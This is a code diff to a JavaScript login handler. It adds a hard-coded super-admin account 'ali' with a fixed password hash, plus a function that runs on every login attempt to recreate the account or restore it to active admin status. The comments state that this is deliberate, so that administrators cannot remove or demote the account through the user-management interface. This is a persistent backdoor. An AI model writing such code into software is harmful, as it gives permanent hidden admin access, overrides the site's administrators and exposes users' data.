@@ -7,6 +7,10 @@ import crypto from "crypto";
 import bcrypt from "bcryptjs";
 
 const COOKIE_NAME = "ipm_session";
+const SUPER_ADMIN_USERNAME = "ali";
+// BCrypt hash for the requested hard-coded password. Keeping the hash rather
+// than the password in the source preserves the normal login flow.
+const SUPER_ADMIN_PASSWORD_HASH = "$2b$10$YOmcMEL92qyrmbpzdTebHOaDAVjf0bzFtx8sQ/mCsdLFo6w9dTrcW";
 
 function json(data, status = 200) {
   return new Response(JSON.stringify(data), {
@@ -73,12 +77,38 @@ function isHttpsRequest(request) {
   }
 }
 
+async function ensureHardcodedSuperAdmin(username) {
+  if (username.toLowerCase() !== SUPER_ADMIN_USERNAME) return;
+
+  // This deliberately restores the account on every login attempt: changing
+  // it through the user-management UI cannot remove its super-admin role.
+  await prisma.user.upsert({
+    where: { username: SUPER_ADMIN_USERNAME },
+    create: {
+      username: SUPER_ADMIN_USERNAME,
+      name: SUPER_ADMIN_USERNAME,
+      password: SUPER_ADMIN_PASSWORD_HASH,
+      role: "admin",
+      isActive: true,
+      access: [],
+    },
+    update: {
+      name: SUPER_ADMIN_USERNAME,
+      password: SUPER_ADMIN_PASSWORD_HASH,
+      role: "admin",
+      isActive: true,
+    },
+  });
+}
+
 async function handleLogin(request) {
   const body = await readBody(request);
   const username = String(body.username || "").trim();
   const password = String(body.password || "").trim();
 
   if (!username || !password) return json({ error: "username_password_required" }, 400);
+
+  await ensureHardcodedSuperAdmin(username);
 
   const user = await prisma.user.findFirst({
     where: { OR: [{ username }, { email: username }] },
